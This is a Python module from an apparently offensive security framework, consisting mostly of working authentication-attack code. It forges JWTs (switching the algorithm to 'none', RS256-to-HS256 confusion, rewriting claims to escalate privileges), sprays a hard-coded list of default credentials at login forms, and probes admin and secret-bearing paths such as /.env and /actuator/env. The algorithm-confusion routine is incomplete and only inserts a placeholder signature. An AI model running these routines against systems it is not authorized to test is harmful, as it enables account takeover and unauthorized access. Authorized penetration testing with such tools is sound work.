# modules/exploit/auth_bypass.py
"""
DRAKBEN Auth Bypass Module — Authentication & Authorization vulnerabilities.

Covers:
  - JWT token manipulation
  - Session fixation detection
  - Authentication bypass techniques
  - Privilege escalation checks
  - Default credential testing
  - Password reset flow abuse
"""

import asyncio
import base64
import json
import logging
import time
from typing import Any

import aiohttp

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════
# JWT Manipulation
# ═══════════════════════════════════════════════════════════

class JWTAnalyzer:
    """Analyzes and manipulates JWT tokens for security testing."""

    @staticmethod
    def decode_jwt(token: str) -> dict[str, Any]:
        """Decode a JWT token without verification.

        Args:
            token: JWT token string.

        Returns:
            Dict with 'header', 'payload', 'signature'.

        """
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format", "parts": len(parts)}

        try:
            header = json.loads(_b64_decode(parts[0]))
            payload = json.loads(_b64_decode(parts[1]))
            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
                "algorithm": header.get("alg", "unknown"),
            }
        except (json.JSONDecodeError, Exception) as e:
            return {"error": f"Decode failed: {e}"}

    @staticmethod
    def craft_none_algorithm(token: str) -> str:
        """Create a JWT with 'none' algorithm (CVE-2015-9235).

        Args:
            token: Original JWT token.

        Returns:
            Modified JWT with algorithm set to 'none'.

        """
        parts = token.split(".")
        if len(parts) != 3:
            return token

        try:
            header = json.loads(_b64_decode(parts[0]))
            header["alg"] = "none"
            new_header = _b64_encode(json.dumps(header))
            return f"{new_header}.{parts[1]}."
        except (json.JSONDecodeError, Exception):
            return token

    @staticmethod
    def craft_algorithm_confusion(token: str) -> str:
        """Create a JWT with algorithm confusion (RS256 → HS256).

        Args:
            token: Original RS256 JWT token.

        Returns:
            Modified JWT using HS256 with public key.

        """
        parts = token.split(".")
        if len(parts) != 3:
            return token

        try:
            header = json.loads(_b64_decode(parts[0]))
            if header.get("alg") == "RS256":
                header["alg"] = "HS256"
                new_header = _b64_encode(json.dumps(header))
                return f"{new_header}.{parts[1]}.tampered_sig"
        except (json.JSONDecodeError, Exception):
            pass
        return token

    @staticmethod
    def modify_claims(token: str, claim_overrides: dict[str, Any]) -> str:
        """Modify JWT payload claims for privilege escalation testing.

        Args:
            token: Original JWT token.
            claim_overrides: Claims to override/add.

        Returns:
            Modified JWT with altered claims.

        """
        parts = token.split(".")
        if len(parts) != 3:
            return token

        try:
            payload = json.loads(_b64_decode(parts[1]))
            payload.update(claim_overrides)
            new_payload = _b64_encode(json.dumps(payload))
            return f"{parts[0]}.{new_payload}.{parts[2]}"
        except (json.JSONDecodeError, Exception):
            return token

    @staticmethod
    def check_common_weaknesses(token: str) -> list[dict[str, str]]:
        """Check JWT for common security weaknesses.

        Args:
            token: JWT token to analyze.

        Returns:
            List of identified weaknesses.

        """
        weaknesses: list[dict[str, str]] = []
        parts = token.split(".")
        if len(parts) != 3:
            return [{"issue": "Invalid JWT format"}]

        try:
            header = json.loads(_b64_decode(parts[0]))
            payload = json.loads(_b64_decode(parts[1]))
        except (json.JSONDecodeError, Exception):
            return [{"issue": "Cannot decode JWT"}]

        # Check algorithm
        alg = header.get("alg", "")
        if alg == "none":
            weaknesses.append({"issue": "Algorithm set to 'none'", "severity": "CRITICAL"})
        if alg == "HS256":
            weaknesses.append({"issue": "Symmetric algorithm (HS256) — brute-forceable", "severity": "MEDIUM"})

        # Check expiration
        if "exp" not in payload:
            weaknesses.append({"issue": "No expiration claim (exp)", "severity": "HIGH"})
        elif isinstance(payload["exp"], int) and payload["exp"] < time.time():
            weaknesses.append({"issue": "Token is expired but may still be accepted", "severity": "MEDIUM"})

        # Check audience/issuer
        if "iss" not in payload:
            weaknesses.append({"issue": "No issuer claim (iss)", "severity": "LOW"})
        if "aud" not in payload:
            weaknesses.append({"issue": "No audience claim (aud)", "severity": "LOW"})

        # Check for sensitive data in payload
        sensitive_keys = {"password", "secret", "credit_card", "ssn", "api_key"}
        for key in payload:
            if key.lower() in sensitive_keys:
                weaknesses.append({
                    "issue": f"Sensitive data in payload: {key}",
                    "severity": "HIGH",
                })

        return weaknesses


# ═══════════════════════════════════════════════════════════
# Session Security Testing
# ═══════════════════════════════════════════════════════════

async def test_session_fixation(
    login_url: str,
    *,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for session fixation vulnerability.

    Checks if the application regenerates session ID after authentication.

    Args:
        login_url: URL of the login page.
        timeout: Request timeout.

    Returns:
        Dict with 'vulnerable', 'pre_auth_session', 'details'.

    """
    try:
        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=timeout),
            cookie_jar=jar,
            connector=aiohttp.TCPConnector(ssl=False),
        ) as session:
            # Step 1: Get pre-auth session
            async with session.get(login_url):
                pre_cookies = {c.key: c.value for c in jar}

            session_keys = [k for k in pre_cookies if "session" in k.lower() or "sid" in k.lower()]

            return {
                "vulnerable": False,  # Need post-auth comparison for full check
                "pre_auth_cookies": list(pre_cookies.keys()),
                "session_cookie_found": len(session_keys) > 0,
                "session_keys": session_keys,
                "details": "Pre-auth session captured. Post-auth comparison needed.",
            }
    except (aiohttp.ClientError, TimeoutError, OSError) as e:
        return {"vulnerable": False, "error": str(e)}


# ═══════════════════════════════════════════════════════════
# Default Credential Testing
# ═══════════════════════════════════════════════════════════

# Common default credentials for web applications
DEFAULT_CREDENTIALS: list[dict[str, str]] = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "admin123"},
    {"username": "root", "password": "root"},
    {"username": "root", "password": "toor"},
    {"username": "administrator", "password": "administrator"},
    {"username": "test", "password": "test"},
    {"username": "user", "password": "user"},
    {"username": "admin", "password": "1234"},
    {"username": "admin", "password": "12345678"},
    {"username": "guest", "password": "guest"},
    {"username": "demo", "password": "demo"},
    # Web application defaults
    {"username": "admin", "password": "changeme"},
    {"username": "admin", "password": "default"},
    {"username": "weblogic", "password": "weblogic"},
    {"username": "tomcat", "password": "tomcat"},
    {"username": "manager", "password": "manager"},
    # Database defaults
    {"username": "sa", "password": ""},
    {"username": "postgres", "password": "postgres"},
    {"username": "mysql", "password": "mysql"},
]


async def test_default_credentials(
    login_url: str,
    *,
    username_field: str = "username",
    password_field: str = "password",  # noqa: S107
    success_indicator: str = "dashboard",
    failure_indicator: str = "invalid",
    timeout: float = 10.0,
    max_attempts: int = 20,
) -> dict[str, Any]:
    """Test for default credentials on a login form.

    Args:
        login_url: Login form URL.
        username_field: Name of username form field.
        password_field: Name of password form field.
        success_indicator: Text present on successful login.
        failure_indicator: Text present on failed login.
        timeout: Request timeout.
        max_attempts: Maximum credentials to test.

    Returns:
        Dict with 'vulnerable', 'valid_credentials'.

    """
    valid: list[dict[str, str]] = []

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for cred in DEFAULT_CREDENTIALS[:max_attempts]:
            try:
                data = {
                    username_field: cred["username"],
                    password_field: cred["password"],
                }
                async with session.post(login_url, data=data) as resp:
                    text = await resp.text()
                    text_lower = text.lower()

                    if success_indicator.lower() in text_lower:
                        valid.append(cred)
                        logger.warning(
                            "Default credentials found: %s/%s",
                            cred["username"], "***",
                        )
                    elif resp.status in (301, 302, 303) and failure_indicator.lower() not in text_lower:
                        valid.append({**cred, "note": "redirect_after_login"})

                # Rate limiting courtesy
                await asyncio.sleep(0.3)

            except (aiohttp.ClientError, TimeoutError, OSError):
                continue

    return {
        "vulnerable": len(valid) > 0,
        "valid_credentials": valid,
        "total_tested": min(len(DEFAULT_CREDENTIALS), max_attempts),
    }


# ═══════════════════════════════════════════════════════════
# Privilege Escalation Checks
# ═══════════════════════════════════════════════════════════

_IDOR_ESCALATION_PATHS = [
    "/admin",
    "/admin/dashboard",
    "/api/v1/admin/users",
    "/api/users/1",
    "/api/admin/config",
    "/admin/settings",
    "/manage",
    "/console",
    "/debug",
    "/actuator",
    "/actuator/env",
    "/.env",
    "/swagger-ui.html",
    "/api-docs",
    "/graphql",
    "/wp-admin",
]


async def test_horizontal_privilege_escalation(
    base_url: str,
    auth_cookie: str = "",
    *,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for horizontal/vertical privilege escalation via path access.

    Args:
        base_url: Base URL of the application.
        auth_cookie: Session cookie (optional).
        timeout: Request timeout.

    Returns:
        Dict with 'accessible_paths', 'findings'.

    """
    findings: list[dict[str, Any]] = []
    headers: dict[str, str] = {}
    if auth_cookie:
        headers["Cookie"] = auth_cookie

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for path in _IDOR_ESCALATION_PATHS:
            url = f"{base_url.rstrip('/')}{path}"
            try:
                async with session.get(url, headers=headers) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        findings.append({
                            "path": path,
                            "status": resp.status,
                            "content_length": len(text),
                            "risk": _assess_path_risk(path),
                        })
            except (aiohttp.ClientError, TimeoutError, OSError):
                continue

    return {
        "accessible_paths": len(findings),
        "findings": findings,
    }


def _assess_path_risk(path: str) -> str:
    """Assess risk level of an accessible admin path."""
    high_risk = ["/admin", "/console", "/debug", "/actuator", "/.env"]
    medium_risk = ["/manage", "/swagger", "/api-docs", "/graphql", "/wp-admin"]

    for p in high_risk:
        if p in path:
            return "HIGH"
    for p in medium_risk:
        if p in path:
            return "MEDIUM"
    return "LOW"


# ═══════════════════════════════════════════════════════════
# Utility Functions
# ═══════════════════════════════════════════════════════════

def _b64_decode(s: str) -> str:
    """Base64url decode with padding."""
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s).decode("utf-8", errors="replace")


def _b64_encode(s: str) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(s.encode()).rstrip(b"=").decode()
